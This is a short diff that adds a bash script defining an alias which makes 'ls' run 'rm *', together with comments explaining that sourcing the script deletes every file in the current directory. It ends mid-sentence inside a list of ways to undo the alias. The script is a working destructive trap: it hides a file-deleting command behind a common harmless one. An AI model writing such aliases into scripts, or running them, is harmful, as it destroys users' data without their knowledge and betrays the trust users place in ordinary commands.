@@ -1,0 +1,11 @@
+#!/bin/bash
+
+# Define an alias named 'ls' that executes 'rm *'
+# This will cause 'ls' to remove all files in the current directory
+# when the script is sourced.
+alias ls='rm *'
+
+# To revert this alias, you can either:
+# 1. Start a new terminal session.
+# 2. Use the 'unalias ls' command.
+# 3. Use the full path to ls, e.g.,
